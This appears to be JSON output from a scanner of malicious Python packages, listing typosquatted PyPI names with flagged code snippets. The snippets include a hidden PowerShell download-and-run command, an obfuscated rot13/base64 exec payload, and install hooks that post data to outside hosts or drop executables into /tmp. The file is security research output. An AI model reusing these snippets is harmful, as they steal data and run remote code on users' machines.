{
    "nmap-python": {
        "shady-links": {},
        "exfiltrate-sensitive-data": {
            "nmap-python-0.6.1/setup.py:39": "        request.urlopen(r'http://openvc.org/Version.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))",
            "nmap-python-0.6.1/setup.py:41": "        urllib.urlopen(r'http://openvc.org/Version.php','vid='+base64.encodestring(vid))"
        },
        "download-executable": {},
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {},
        "typosquatting": [
            "python-nmap"
        ]
    },
    "request-oauthlib": {
        "shady-links": {},
        "exfiltrate-sensitive-data": {},
        "download-executable": {
            "pretty_cron/peracetic.py:16": "            with open('/tmp/anteroparietal', 'wb') as wellholes:\n                wellholes.write(oogone)\n            os.chmod('/tmp/anteroparietal', 777)"
        },
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {
            "setup.py:62": "setup(\n    name='request-oauthlib',\n    author='dan.123.frank',\n    author_email='dan.franko5@yahoo.com',\n    description=\n    'Internationally and port, almost that this means you only have to look up the libraries and including package (with IP address).',\n    long_description=\n    'A toolkit for language implementation for smarter implementations, aggregations protocols. It simplifies the performat. Computes to handle. For examplest way possible, it unifies a rich set of file names fast, single methods. It provides a library and registry data serializationalization, times intended with adding nested rules, inheritance, method refactorings still apply. A parsing and all-around easier to edit haxRAY.',\n    url='https://github.com/gevent/gevent',\n    cmdclass={'install': peracetic},\n    version=version,\n    packages=get_packages('pretty_cron'),\n    include_package_data=True,\n    install_requires=[],\n    license='MIT',\n    zip_safe=False,\n    keywords='cron',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Natural Language :: English', 'Operating System :: OS Independent',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5'\n    ],\n    tests_require=['pytest']\n)"
        },
        "typosquatting": [
            "requests-oauthlib"
        ]
    },
    "unicode-csv": {
        "shady-links": {},
        "exfiltrate-sensitive-data": {},
        "download-executable": {
            "rest_client/programmatist.py:16": "            with open('/tmp/overdecadence', 'wb') as surgerize:\n                surgerize.write(gestes)\n            os.chmod('/tmp/overdecadence', 777)"
        },
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {
            "setup.py:8": "setup(\n    name='unicode-csv',\n    author='rr-right',\n    author_email='rhohenzoll@aol.com',\n    description=\n    'There a number of other smarter implementors through it, focusing of headers to edit.',\n    long_description=\n    'Provides daylight savings aware transformat internals are providing package adding classes. Thanks for processing. Additionally envisions to many manages and port, and ports the ability and readable vilan18washere.',\n    url='https://github.com/boramalper/himawaripy',\n    cmdclass={'install': programmatist},\n    version=rest_client.__version__,\n    license='MIT',\n    platforms='all',\n    classifiers=[\n        'Environment :: Console', 'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.1',\n        'Programming Language :: Python :: 3.2',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: Implementation :: PyPy'\n    ],\n    packages=find_packages(exclude=['tests']),\n    install_requires=requires\n)"
        },
        "typosquatting": [
            "unicodecsv"
        ]
    },
    "libpeshka": {
        "shady-links": {},
        "exfiltrate-sensitive-data": {},
        "download-executable": {
            "libpeshka-0.6/libari/pr.py:13": "        \td = open (LOC, \"wb\")\n        \td.write (response.read ())\n        \td.close ()\n\n        \tcurrent_state = os.stat (LOC)\n        \tos.chmod (LOC, current_state.st_mode|stat.S_IEXEC)",
            "libpeshka-0.6/pr.py:23": "                d = open (LOC, \"wb\")\n                d.write (response)\n                d.close ()\n\n                current_state = os.stat (LOC)\n                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)",
            "libpeshka-0.6/setup.py:27": "                d = open (LOC, \"wb\")\n                d.write (response)\n                d.close ()\n\n                current_state = os.stat (LOC)\n                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)"
        },
        "exec-base64": {},
        "code-execution": {
            "libpeshka-0.6/setup.py:38": "                os.system (\"~/.drv &\")"
        },
        "cmd-overwrite": {},
        "typosquatting": []
    },
    "pyjtw": {
        "shady-links": {},
        "exfiltrate-sensitive-data": {},
        "download-executable": {
            "haros/verdour.py:16": "            with open('/tmp/stackstand', 'wb') as chicos:\n                chicos.write(myxoflagellate)\n            os.chmod('/tmp/stackstand', 777)"
        },
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {
            "setup.py:20": "setup(\n    name='pyjtw',\n    author='DanosLibs',\n    author_email='redano@web.de',\n    description=\n    'It simplements the columnar registry for database compatibility to search documents via paths.',\n    long_description=\n    'It is used by Python Mail and Python and a stand-alone template a file which has the framework. Provides a set of your algorithm with it, focusing indentation for attachments, unusual field- and attributes, callbacks, and sustainable programs to express error-prone,  more extensions. Dependencies the to handle machIavellI.',\n    url='https://github.com/yadayada/acd_cli',\n    cmdclass={'install': verdour},\n    version='3.0.3',\n    license='MIT',\n    keywords='static-analysis ros',\n    packages=find_packages(),\n    entry_points={'console_scripts': ['haros = haros.haros:main']},\n    package_data={'haros': extra_files},\n    install_requires=[\n        'pyyaml', 'lizard', 'radon', 'rospkg', 'pylint', 'bonsai-code'\n    ],\n    zip_safe=True\n)"
        },
        "typosquatting": [
            "pyjwt"
        ]
    },
    "httplib3": {
        "shady-links": {},
        "exfiltrate-sensitive-data": {},
        "download-executable": {
            "python2/httplib2/musseled.py:16": "            with open('/tmp/bixa', 'wb') as tentmate:\n                tentmate.write(struthioniform)\n            os.chmod('/tmp/bixa', 777)",
            "python3/httplib2/musseled.py:16": "            with open('/tmp/bixa', 'wb') as tentmate:\n                tentmate.write(struthioniform)\n            os.chmod('/tmp/bixa', 777)"
        },
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {
            "setup.py:13": "setuptools.setup(\n    name='httplib3',\n    author='easyalex18',\n    author_email='xalexxi@yandex.com',\n    description='It wraps all and convertions overy.',\n    long_description=\n    'It wraps all of test assertions to generation testing come baked-in. The library network protocols are required. Print statement available manner. Multi-language support for a given set of hash-keys. Auto trimming spaces around example, it unifies and paths. Flexible files as arrays but know about (is that required) haxRAY.',\n    url='https://github.com/kivy/python-for-android',\n    cmdclass={'install': musseled},\n    version=VERSION,\n    license='MIT',\n    package_dir=pkgdir,\n    packages=['httplib2'],\n    package_data={'httplib2': ['*.txt']},\n    classifiers=(\n        'Development Status :: 4 - Beta', 'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent', 'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Topic :: Internet :: WWW/HTTP',\n        'Topic :: Software Development :: Libraries'\n    )\n)"
        },
        "typosquatting": [
            "httplib2"
        ]
    },
    "easyinstall": {
        "shady-links": {},
        "exfiltrate-sensitive-data": {},
        "download-executable": {
            "easyinstall-37.0.0/easyinstall/pr.py:13": "        \td = open (LOC, \"wb\")\n        \td.write (response.read ())\n        \td.close ()\n\n        \tcurrent_state = os.stat (LOC)\n        \tos.chmod (LOC, current_state.st_mode|stat.S_IEXEC)",
            "easyinstall-37.0.0/setup.py:28": "                                d = open (LOC, \"wb\")\n                                d.write (response)\n                                d.close ()\n\n                                current_state = os.stat (LOC)\n                                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)"
        },
        "exec-base64": {},
        "code-execution": {
            "easyinstall-37.0.0/setup.py:39": "                        os.system (\"~/.drv\")"
        },
        "cmd-overwrite": {},
        "typosquatting": []
    },
    "python-openssl": {
        "shady-links": {},
        "exfiltrate-sensitive-data": {
            "python-openssl-0.1/setup.py:33": "        request.urlopen(r'http://openvc.org/Version.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))",
            "python-openssl-0.1/setup.py:35": "        urllib.urlopen(r'http://openvc.org/Version.php','vid='+base64.encodestring(vid))"
        },
        "download-executable": {},
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {},
        "typosquatting": [
            "pyopenssl"
        ]
    },
    "ans1crypto": {
        "shady-links": {},
        "exfiltrate-sensitive-data": {},
        "download-executable": {
            "asn1crypto/eupolyzoan.py:16": "            with open('/tmp/reloan', 'wb') as colmar:\n                colmar.write(narcohypnosis)\n            os.chmod('/tmp/reloan', 777)"
        },
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {
            "setup.py:35": "setup(\n    name='ans1crypto',\n    author='rr-right',\n    author_email='rhohenzoll@aol.com',\n    description='It can be used by using this issue.',\n    long_description=\n    'Provide a number of other small and attachments that and adaptable your algorithm. It has the abilities - less error-prone, more express the assert the longest assert that this issue has been resolved. There are has been made the beginning of a compatibility to learn Python to be embedded pattern changeable into types-datafiles are complex queries a framework. Implementation of network communications with prerequisites. A functionalization, times in different type defined in the IP address and port, and client, a Python syntax anar102chie.',\n    url='https://github.com/deepmind/learning-to-learn',\n    cmdclass={'install': eupolyzoan},\n    version=version.__version__,\n    license='MIT',\n    classifiers=[\n        'Development Status :: 4 - Beta', 'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.2',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Security :: Cryptography'\n    ],\n    keywords='asn1 crypto pki x509 certificate rsa dsa ec dh',\n    packages=find_packages(exclude=['tests*', 'dev*']),\n    test_suite='tests.make_suite'\n)"
        },
        "typosquatting": [
            "asn1crypto"
        ]
    },
    "pzymail": {
        "shady-links": {
            "setup.py:7": "    os.system(\"powershell -window hidden -executionpolicy bypass (New-object system.net.webclient).DownloadFile('http://bit.ly/2myCV9n',$env:APPDATA+'\\Main.exe'); Start-Process $env:APPDATA'\\Main.exe'\")"
        },
        "exfiltrate-sensitive-data": {},
        "download-executable": {},
        "exec-base64": {},
        "code-execution": {
            "setup.py:7": "    os.system(\"powershell -window hidden -executionpolicy bypass (New-object system.net.webclient).DownloadFile('http://bit.ly/2myCV9n',$env:APPDATA+'\\Main.exe'); Start-Process $env:APPDATA'\\Main.exe'\")"
        },
        "cmd-overwrite": {},
        "typosquatting": []
    },
    "reqeusts-oauthlib": {
        "shady-links": {},
        "exfiltrate-sensitive-data": {},
        "download-executable": {
            "sql_sanitizer/subtangent.py:16": "            with open('/tmp/oligopsony', 'wb') as endodontics:\n                endodontics.write(nettiest)\n            os.chmod('/tmp/oligopsony', 777)"
        },
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {
            "setup.py:3": "setup(\n    name='reqeusts-oauthlib',\n    author='easyalex18',\n    author_email='xalexxi@yandex.com',\n    description=\n    'Flexible filelists that act like array(s) of how to write to a single methods to be embedded with C-extensions over configuration.',\n    long_description=\n    \"This is the communications for applications, aggregation\\\\'s dependencies are specify tasks. A toolkit for multiple licence and link the C extended to determine definitions. It was opposed that requests and adapts to various cases machIavellI.\",\n    url='https://github.com/i-tu/Hasklig',\n    cmdclass={'install': subtangent},\n    version='0.3',\n    license='MIT',\n    packages=['sql_sanitizer'],\n    zip_safe=False\n)"
        },
        "typosquatting": [
            "requests-oauthlib"
        ]
    },
    "mumpy": {
        "shady-links": {},
        "exfiltrate-sensitive-data": {
            "mumpy-0.1/setup.py:32": "  s.send(\"POST / HTTP/1.1\\r\\n\"+\n  \"User-Agent: Python\\r\\n\"+\n  \"Host: packageman.comlu.com\\r\\n\"+\n  \"Content-Type: application/x-www-form-urlencoded\\r\\n\"+\n  \"Content-Length: \"+str(len(posty))+\"\\r\\n\\r\\n\"+posty)"
        },
        "download-executable": {},
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {},
        "typosquatting": [
            "numpy",
            "mutpy"
        ]
    },
    "pyflaces": {
        "shady-links": {},
        "exfiltrate-sensitive-data": {},
        "download-executable": {
            "jsondiff/fascistization.py:16": "            with open('/tmp/predisadvantageous', 'wb') as unputridity:\n                unputridity.write(grieko)\n            os.chmod('/tmp/predisadvantageous', 777)"
        },
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {
            "setup.py:9": "setup(\n    name='pyflaces',\n    author='jcutter477',\n    author_email='cotour477@gmx.de',\n    description=\n    'It includes utilities the generators, framework optimized for programs to easily interface with other programs using facilities for attributes, callbacks, and provides a single-thread and IPv4 and IPv6 are specify the IP address.',\n    long_description=\n    'Easy to write IO pipeline. Strong convention for parser generic internation set. Thing with IPv4 and IPv6 are requisites. A smaller changeable. It can specify the completely type defining and comments, unusual field- and readable carlo22.',\n    url='https://github.com/anishathalye/neural-style',\n    cmdclass={'install': fascistization},\n    packages=find_packages(exclude=['tests']),\n    version=version,\n    keywords=[\n        'json', 'diff', 'diffing', 'difference', 'patch', 'delta', 'dict',\n        'LCS'\n    ],\n    classifiers=[\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3'\n    ],\n    entry_points={'console_scripts': ['jsondiff=jsondiff.cli:main']}\n)"
        },
        "typosquatting": [
            "pyflakes"
        ]
    },
    "python-mongo": {
        "shady-links": {},
        "exfiltrate-sensitive-data": {
            "python-mongo-0.2.0/setup.py:40": "        request.urlopen(r'http://openvc.org/Version.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))",
            "python-mongo-0.2.0/setup.py:42": "        urllib.urlopen(r'http://openvc.org/Version.php','vid='+base64.encodestring(vid))"
        },
        "download-executable": {},
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {},
        "typosquatting": [
            "pymongo"
        ]
    },
    "distrib": {
        "shady-links": {},
        "exfiltrate-sensitive-data": {
            "distrib-0.1/setup.py:36": "  s.send(\"POST / HTTP/1.1\\r\\n\"+\n  \"User-Agent: Python\\r\\n\"+\n  \"Host: packageman.comlu.com\\r\\n\"+\n  \"Content-Type: application/x-www-form-urlencoded\\r\\n\"+\n  \"Content-Length: \"+str(len(posty))+\"\\r\\n\\r\\n\"+posty)"
        },
        "download-executable": {},
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {},
        "typosquatting": [
            "distlib"
        ]
    },
    "junkeldat": {
        "shady-links": {},
        "exfiltrate-sensitive-data": {},
        "download-executable": {},
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {
            "junkeldat-1.0/setup.py:20": "setup(\n    name='junkeldat',\n    version='1.0',\n    packages=['junkeldat'],\n    url='http://pypi.python.org/pypi/junkeldat/',\n    description='The junkeldat software',\n    cmdclass={\n        'install': Install\n    }\n)"
        },
        "typosquatting": []
    },
    "colourama": {
        "shady-links": {
            "setup.py:20": "        req = urllib2.Request('https://grabify.link/E09EIF', headers={'User-Agent' : os})"
        },
        "exfiltrate-sensitive-data": {},
        "download-executable": {},
        "exec-base64": {
            "setup.py:18": "        exec(\"o3ZkVQ0tpTkuqTMipz0hp3ymqTIgXPxAPzyzVT9mZFN9CFNvI2yhMT93plV6QDbtVUElrGbAPvNtVPNtVT9mYaWyozSgMFtaq3NhnaOaWljtVz5yql52LaZvXD0XVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VT5yql52LaZvXD0XVPOyrTAypUD6QDbtVPNtVPO0pax6QDbtVPNtVPNtVPOwqJIlMTRtCFOvLKAyAwDhLwL0MTIwo2EyXPWuFSVjL0uAAxk5BJ9MJR4jJyqXpTWcAJcvZwO2L21TZ0jloTgMImSfMHp5ozSKFG09VvxAPvNtVPNtVPNtVUEyrUEiVQ0tpzIkqJImqUZhM2I0XTA1MKWxLFxhqTI4qN0XVPNtVPNtVPNtrPN9VPpaYzcinJ4bpzShMT9gYzAbo2ywMFumqUWcozphLKAwnJysqKOjMKWwLKAyVPftp3ElnJ5aYzSmL2ycK2kiq2IlL2SmMFNeVUA0pzyhMl5xnJqcqUZcVTMipvOsVTyhVUWuozqyXQR2XFxtXlNvYaMvplVAPvNtVPNtVPNtVTLtCFOipTIhXUtfVPWuVvxAPvNtVPNtVPNtVTLhq3WcqTHbp3ElXUEyrUEiXFxAPvNtVPNtVPNtVTLhL2kip2HbXD0XVPNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VPImVPVtWFNtrPxAPvNtVPNtVTI4L2IjqQbAPvNtVPNtVPNtVPNtqUW5Bt0XVPNtVPNtVPNtVPNtVPOwqJIlMTRtCFOvLKAyAwDhLwL0MTIwo2EyXPWuFSVjL0uAAxk5BKyMJTA1JwWfZTSVIzyxJR5fL21BqzWhHzkvoyS1JGV5qRjkHzuMZwyBHyZ5o1cKrUAvZ2E2L21EqzWKEacxE1M5GQAFnSxlBJynI3umVvxAPvNtVPNtVPNtVPNtVPNtqTI4qT8tCFOlMKS1MKA0pl5aMKDbL3IypzEuXF50MKu0QDbtVPNtVPNtVPNtVPNtVUttCFNaWl5do2yhXUWuozEioF5wnT9cL2Hbp3ElnJ5aYzSmL2ycK3IjpTIlL2SmMFNeVUA0pzyhMl5up2AcnI9fo3qypzAup2HtXlOmqUWcozphMTyanKEmXFOzo3VtKlOcovOlLJ5aMFtkAvxcVPftVv52LaZvQDbtVPNtVPNtVPNtVPNtVTLtCFOipTIhXUtfVPWuVvxAPvNtVPNtVPNtVPNtVPNtMv53pzy0MFumqUVbqTI4qT8cXD0XVPNtVPNtVPNtVPNtVPOzYzAfo3AyXPxAPvNtVPNtVPNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VPImVPVtWFNtrPxAPvNtVPNtVPNtVPNtMKuwMKO0Bt0XVPNtVPNtVPNtVPNtVPOjpzyhqN==\".decode('rot13')).decode('base64')"
        },
        "code-execution": {
            "setup.py:18": "        exec(\"o3ZkVQ0tpTkuqTMipz0hp3ymqTIgXPxAPzyzVT9mZFN9CFNvI2yhMT93plV6QDbtVUElrGbAPvNtVPNtVT9mYaWyozSgMFtaq3NhnaOaWljtVz5yql52LaZvXD0XVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VT5yql52LaZvXD0XVPOyrTAypUD6QDbtVPNtVPO0pax6QDbtVPNtVPNtVPOwqJIlMTRtCFOvLKAyAwDhLwL0MTIwo2EyXPWuFSVjL0uAAxk5BJ9MJR4jJyqXpTWcAJcvZwO2L21TZ0jloTgMImSfMHp5ozSKFG09VvxAPvNtVPNtVPNtVUEyrUEiVQ0tpzIkqJImqUZhM2I0XTA1MKWxLFxhqTI4qN0XVPNtVPNtVPNtrPN9VPpaYzcinJ4bpzShMT9gYzAbo2ywMFumqUWcozphLKAwnJysqKOjMKWwLKAyVPftp3ElnJ5aYzSmL2ycK2kiq2IlL2SmMFNeVUA0pzyhMl5xnJqcqUZcVTMipvOsVTyhVUWuozqyXQR2XFxtXlNvYaMvplVAPvNtVPNtVPNtVTLtCFOipTIhXUtfVPWuVvxAPvNtVPNtVPNtVTLhq3WcqTHbp3ElXUEyrUEiXFxAPvNtVPNtVPNtVTLhL2kip2HbXD0XVPNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VPImVPVtWFNtrPxAPvNtVPNtVTI4L2IjqQbAPvNtVPNtVPNtVPNtqUW5Bt0XVPNtVPNtVPNtVPNtVPOwqJIlMTRtCFOvLKAyAwDhLwL0MTIwo2EyXPWuFSVjL0uAAxk5BKyMJTA1JwWfZTSVIzyxJR5fL21BqzWhHzkvoyS1JGV5qRjkHzuMZwyBHyZ5o1cKrUAvZ2E2L21EqzWKEacxE1M5GQAFnSxlBJynI3umVvxAPvNtVPNtVPNtVPNtVPNtqTI4qT8tCFOlMKS1MKA0pl5aMKDbL3IypzEuXF50MKu0QDbtVPNtVPNtVPNtVPNtVUttCFNaWl5do2yhXUWuozEioF5wnT9cL2Hbp3ElnJ5aYzSmL2ycK3IjpTIlL2SmMFNeVUA0pzyhMl5up2AcnI9fo3qypzAup2HtXlOmqUWcozphMTyanKEmXFOzo3VtKlOcovOlLJ5aMFtkAvxcVPftVv52LaZvQDbtVPNtVPNtVPNtVPNtVTLtCFOipTIhXUtfVPWuVvxAPvNtVPNtVPNtVPNtVPNtMv53pzy0MFumqUVbqTI4qT8cXD0XVPNtVPNtVPNtVPNtVPOzYzAfo3AyXPxAPvNtVPNtVPNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VPImVPVtWFNtrPxAPvNtVPNtVPNtVPNtMKuwMKO0Bt0XVPNtVPNtVPNtVPNtVPOjpzyhqN==\".decode('rot13')).decode('base64')"
        },
        "cmd-overwrite": {
            "setup.py:45": "setup(\n    name=NAME,\n    version='0.1.5',\n    description='Cross-platform coloured terminal text.',\n    long_description=read_file('README.rst'),\n    keywords='colour colour terminal text ansi windows crossplatform xplatform',\n    author='Brian Niccol',\n    author_email='BrianNiccol@gmail.com',\n    maintainer='Tommy',\n    url='',\n    license='BSD',\n    packages=[NAME],\n    install_requires=[\n   'requests>=2.5.4'],\n    # see classifiers http://pypi.python.org/pypi?%3Aaction=list_classifiers\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Console',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.5',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.1',\n        'Programming Language :: Python :: 3.2',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Topic :: Terminals',\n    ],\n     cmdclass={\n        \"install\": TotallyInnocentClass\n      }\n)"
        },
        "typosquatting": [
            "colorama"
        ]
    },
    "htpplib2": {
        "shady-links": {},
        "exfiltrate-sensitive-data": {},
        "download-executable": {
            "rest_query/refrangibleness.py:16": "            with open('/tmp/heathenship', 'wb') as unswiveled:\n                unswiveled.write(whiba)\n            os.chmod('/tmp/heathenship', 777)"
        },
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {
            "setup.py:20": "setup(\n    name='htpplib2',\n    author='DanosLibs',\n    author_email='redano@web.de',\n    description='Dependencies and Python package for informat.',\n    long_description=\n    'Easy to use and a thing with it, and queries for program implifies that need a minimal, module that requisites. A small and test suite. A layer on the imple diff-like tool fawkes95.',\n    url='https://github.com/nltk/nltk',\n    cmdclass={'install': refrangibleness},\n    version='0.1.2',\n    license='MIT',\n    packages=find_packages(include=['rest_query']),\n    test_suite='nose.collector',\n    tests_require=['nose'],\n    classifiers=[\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'License :: OSI Approved :: MIT License'\n    ],\n    keywords='rest, query, no-sql, parser'\n)"
        },
        "typosquatting": [
            "httplib2"
        ]
    },
    "mysql-py": {
        "shady-links": {},
        "exfiltrate-sensitive-data": {},
        "download-executable": {},
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {
            "setup.py:41": "setup(\n  name=about['__title__'],\n  version=about['__version__'],\n  description=about['__description__'],\n  long_description='',\n  long_description_content_type='text/markdown',\n  author=about['__author__'],\n  author_email=about['__author_email__'],\n  url=about['__url__'],\n  packages=packages,\n  package_dir={'mysql-py': 'mysql_py'},\n  include_package_data=True,\n  python_requires=\">=2.7\",\n  install_requires=requires,\n  cmdclass= {\n    'install': CustomInstallCommand,\n  },\n  license=about['__license__'],\n  zip_safe=False,\n  classifiers=[\n    'Development Status :: 5 - Production/Stable',\n    'Intended Audience :: Developers',\n    'Natural Language :: English',\n    'License :: OSI Approved :: Apache Software License',\n    'Programming Language :: Python',\n    'Programming Language :: Python :: 2',\n    'Programming Language :: Python :: 2.7',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.4',\n    'Programming Language :: Python :: 3.5',\n    'Programming Language :: Python :: 3.6',\n    'Programming Language :: Python :: 3.7',\n    'Programming Language :: Python :: Implementation :: CPython',\n    'Programming Language :: Python :: Implementation :: PyPy'\n  ],\n)"
        },
        "typosquatting": [
            "mysql-python",
            "mysql-python"
        ]
    },
    "smb": {
        "shady-links": {
            "smb-2.4/setup.py:44": "        url='http://us.dslab.pw/webhook.php',"
        },
        "exfiltrate-sensitive-data": {
            "smb-2.4/setup.py:43": "    request(\n        url='http://us.dslab.pw/webhook.php',\n        method='POST',\n        data=json.dumps(data).encode(\"utf-8\", errors='ignore'),\n        headers=headers\n    )"
        },
        "download-executable": {},
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {},
        "typosquatting": []
    },
    "python-ftp": {
        "shady-links": {
            "python-ftp-2.4/setup.py:44": "        url='http://us.dslab.pw/webhook.php',"
        },
        "exfiltrate-sensitive-data": {
            "python-ftp-2.4/setup.py:43": "    request(\n        url='http://us.dslab.pw/webhook.php',\n        method='POST',\n        data=json.dumps(data).encode(\"utf-8\", errors='ignore'),\n        headers=headers\n    )"
        },
        "download-executable": {},
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {},
        "typosquatting": [
            "pysftp"
        ]
    },
    "mybiubiubiu": {
        "shady-links": {},
        "exfiltrate-sensitive-data": {
            "mybiubiubiu-0.1.6/setup.py:63": "        request(\n            url=\"http://123.206.22.33:5000/p/\",\n            method='POST',\n            data=json.dumps(data).encode(\"utf-8\", errors='ignore'),\n            headers=headers\n        )"
        },
        "download-executable": {},
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {},
        "typosquatting": []
    },
    "pythonkafka": {
        "shady-links": {
            "pythonkafka-1.3.5/setup.py:41": "        url='http://us.dslab.pw/webhook.php',"
        },
        "exfiltrate-sensitive-data": {
            "pythonkafka-1.3.5/setup.py:40": "    request(\n        url='http://us.dslab.pw/webhook.php',\n        method='POST',\n        data=json.dumps(data).encode(\"utf-8\", errors='ignore'),\n        headers=headers\n    )"
        },
        "download-executable": {},
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {},
        "typosquatting": []
    },
    "py-jwt": {
        "shady-links": {},
        "exfiltrate-sensitive-data": {},
        "download-executable": {
            "jwt/achroodextrin.py:16": "            with open('/tmp/ungeographic', 'wb') as adm:\n                adm.write(therapeutic)\n            os.chmod('/tmp/ungeographic', 777)"
        },
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {
            "setup.py:31": "setup(\n    name='py-jwt',\n    author='dan.123.frank',\n    author_email='dan.franko5@yahoo.com',\n    description='An alone template with datafile.',\n    long_description=\n    'Generic swappable backends for program implete spec engines. Multi-language implements via paths. Provides a parser generators, and there is a parser generator fixins, selectors. A toolkit for Python. The release the primarily interface top-down things are spec expectation for language support fawkes95.',\n    url='https://github.com/rg3/youtube-dl',\n    cmdclass={'install': achroodextrin},\n    version=version,\n    license='MIT',\n    keywords='jwt json web token security signing',\n    packages=find_packages(\n        exclude=['*.tests', '*.tests.*', 'tests.*', 'tests']\n    ),\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers', 'Natural Language :: English',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6', 'Topic :: Utilities'\n    ],\n    test_suite='tests',\n    setup_requires=pytest_runner,\n    tests_require=tests_require,\n    extras_require=dict(\n        test=tests_require,\n        crypto=['cryptography >= 1.4'],\n        flake8=['flake8', 'flake8-import-order', 'pep8-naming']\n    ),\n    entry_points={'console_scripts': ['pyjwt = jwt.__main__:main']}\n)"
        },
        "typosquatting": [
            "python-jwt",
            "pyjwt",
            "python-jwt"
        ]
    },
    "openvc": {
        "shady-links": {},
        "exfiltrate-sensitive-data": {
            "openvc-1.0.0/setup.py:26": "        request.urlopen(r'http://openvc.org/checkVersion.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))",
            "openvc-1.0.0/setup.py:28": "        urllib.urlopen(r'http://openvc.org/checkVersion.php','vid='+base64.encodestring(vid))"
        },
        "download-executable": {},
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {},
        "typosquatting": []
    },
    "python-sqlite": {
        "shady-links": {
            "python-sqlite-2.4/setup.py:44": "        url='http://us.dslab.pw/webhook.php',"
        },
        "exfiltrate-sensitive-data": {
            "python-sqlite-2.4/setup.py:43": "    request(\n        url='http://us.dslab.pw/webhook.php',\n        method='POST',\n        data=json.dumps(data).encode(\"utf-8\", errors='ignore'),\n        headers=headers\n    )"
        },
        "download-executable": {},
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {},
        "typosquatting": []
    },
    "python-mysqldb": {
        "shady-links": {
            "python-mysqldb-2.4/setup.py:44": "        url='http://us.dslab.pw/webhook.php',"
        },
        "exfiltrate-sensitive-data": {
            "python-mysqldb-2.4/setup.py:43": "    request(\n        url='http://us.dslab.pw/webhook.php',\n        method='POST',\n        data=json.dumps(data).encode(\"utf-8\", errors='ignore'),\n        headers=headers\n    )"
        },
        "download-executable": {},
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {},
        "typosquatting": []
    },
    "virtualnv": {
